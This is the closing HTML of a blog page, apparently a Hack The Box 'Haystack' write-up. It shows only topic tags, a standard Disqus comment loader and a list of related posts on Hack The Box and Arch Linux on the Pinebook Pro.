    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
</svg>
      </span>&nbsp;<span class="tag-name">PHP</span>
    </a>
  
    
    <a href="/tags/#elasticsearch">
    
      <span class="icon">
        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"/>
    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
</svg>
      </span>&nbsp;<span class="tag-name">Elasticsearch</span>
    </a>
  
    
    <a href="/tags/#elk">
    
      <span class="icon">
        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"/>
    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
</svg>
      </span>&nbsp;<span class="tag-name">ELK</span>
    </a>
  
</div>
  </div>

  
  <section class="comments">
    <h2>Comments</h2>
    
  <div id="disqus_thread">
    <button class="disqus-load" onClick="loadDisqusComments()">
      Load Comments
    </button>
  </div>
  <script>

  /**
  *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW
  *  TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
  *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT:s
  *  https://disqus.com/admin/universalcode/#configuration-variables
  */
  var disqus_config = function () {
      this.page.url = "http://0.0.0.0:4000/hack-the-box-haystack-writeup/";  // Replace PAGE_URL with your page's canonical URL variable
      this.page.identifier = "" || "http://0.0.0.0:4000/hack-the-box-haystack-writeup/";// Replace PAGE_IDENTIFIER with your page's unique identifier variable
  }
  function loadDisqusComments() { // DON'T EDIT BELOW THIS LINE
    var d = document, s = d.createElement('script');
    s.src = '//https-ryankozak-com.disqus.com/embed.js';
    s.setAttribute('data-timestamp', +new Date());
    (d.head || d.body).appendChild(s);
  }
  </script>
  <noscript>
    Please enable JavaScript to view the
    <a href="https://disqus.com/?ref_noscript">comments powered by Disqus</a>.
  </noscript>



  </section>

  <section class="related">
  <h2>Related Posts</h2>
  <ul class="posts-list">
    
      <li>
        <h3>
          <a href="/hack-the-box-ophiuchi/">
            Hack The Box - Ophiuchi
            <small>16 Jul 2021</small>
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/luks-encrypted-arch-linux-on-pinebook-pro-again/">
            Installing Arch Linux on the Pinebook Pro with LUKS Encrypted Root...Again
            <small>28 Jun 2021</small>
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/luks-encrypted-arch-linux-on-pinebook-pro/">
            Installing Arch Linux on the Pinebook Pro with LUKS Encrypted Root
            <small>15 Dec 2020</small>
          </a>
        </h3>
      </li>
    
  </ul>
</section>

</div>

    </main>

    
  </body>
</html>
